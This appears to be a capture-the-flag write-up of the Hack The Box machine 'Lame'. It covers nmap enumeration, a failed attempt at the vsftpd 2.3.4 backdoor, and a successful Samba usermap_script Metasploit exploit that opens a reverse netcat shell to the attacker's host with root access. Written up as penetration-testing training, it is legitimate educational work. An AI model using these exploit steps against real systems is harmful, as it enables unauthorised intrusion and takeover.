# Summary
### 1. NMAP Scan
Typical NMAP scan, reveals FTP `vsFTPd v2.3.4` on Port 21.

### 2. First Attack on FTP
We find out if we can upload to the FTP, but could only do Anonymous Read. We also try attacking with FTP metasploit modules, but did not work.

### 3. Finding another attack vector
We do more NMAP scans and find `netbios-ssn Samba smbd 3.0.20-Debian`.

### 4. Second attack on Port 445 Samba
SearchSploit reveals it is susceptible to a `Username map script Command Execution` Metasploit module.
We run it and is able to compromise the system.

# Attack
## 1. NMAP Scan
We do our typical NMAP scan!
```
hippoeug@kali:~$ nmap -sC -sV 10.10.10.3 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-02 21:11 +08
...
Scanning 10.10.10.3 [1000 ports]
Discovered open port 22/tcp on 10.10.10.3
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 139/tcp on 10.10.10.3
Discovered open port 21/tcp on 10.10.10.3
...
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.16
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h30m20s, deviation: 3h32m10s, median: 18s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-01-02T08:12:15-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
...
```
The FTP looks interesting, let's try that out first.

## 2. First Attack on FTP
Shows Port 21 FTP Login allowed amongst other opened ports. Let's see if we can first upload a reverse shell.
```
hippoeug@kali:~$ msfconsole
...
msf5 > use auxiliary/scanner/ftp/anonymous
msf5 auxiliary(scanner/ftp/anonymous) > show options
...
msf5 auxiliary(scanner/ftp/anonymous) > run

[+] 10.10.10.3:21         - 10.10.10.3:21 - Anonymous READ (220 (vsFTPd 2.3.4))
[*] 10.10.10.3:21         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Unfortunately we only get anonymous read access.

Doing `nc 10.10.10.3 21` also confirms it is running `vsFTPd v2.3.4`.

`searchsploit vsftpd 2.3.4` shows `Backdoor Command Execution`.
```
hippoeug@kali:~$ searchsploit vsftpd 2.3.4
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                              | unix/remote/17491.rb
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

We also try metasploit modules.
```
hippoeug@kali:~$ msfconsole
...
msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
...
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```
However, metasploit attacks etc didn't work.

We also try the backdoor manually, but yielded no results.
```
hippoeug@kali:~$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:hippoeug): 123456:)
331 Please specify the password.
Password:
^C
421 Service not available, remote server has closed connection
hippoeug@kali:~$ nc -vn 10.10.10.3 6200
```
We were expecting `(UNKNOWN) [192.168.1.142] 6200 (?) open` but it did not appear.

Sources:
- https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/
- https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/
- https://metalkey.github.io/vsftpd-v234-backdoor-command-execution.html

## 3. Finding another attack vector
Our first NMAP scan was useless. Let's try more nmap scans!

`nmap --script nmap-vulners -sV 10.10.10.3 -Pn -v` but didn't turn out to be useful. (Source: https://securitytrails.com/blog/nmap-vulnerability-scan).

Let's try something else which turned out to be more useful.
`nmap -sC -sV -A -v 10.10.10.3 -Pn`
```
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h30m18s, deviation: 3h32m07s, median: 18s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-11-26T07:45:56-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

```

## 4. Second attack on Port 445 Samba
Shows Samba smbd 3.0.20-Debian.
`searchsploit samba 3.0.20`.
```
hippoeug@kali:~$ searchsploit samba 3.0.20
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                              | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                    | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                               | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                               | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                       | linux_x86/dos/36741.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

There are a few interesting choices, but we are going for `Username map script Command Execution` Metasploit module.
Researching it, we find https://securitytrails.com/blog/nmap-vulnerability-scan.
Let's run the metasploit script `use exploit/multi/samba/usermap_script`.
```
hippoeug@kali:~$ msfconsole
...
msf5 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
...
msf5 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.16:4444 
[*] Command shell session 1 opened (10.10.14.16:4444 -> 10.10.10.3:44602) at 2021-01-02 22:39:18 +0800
```

Boom, we got root access (verified with whoami) and found the flags! They're in `/root`& `/home/makis`.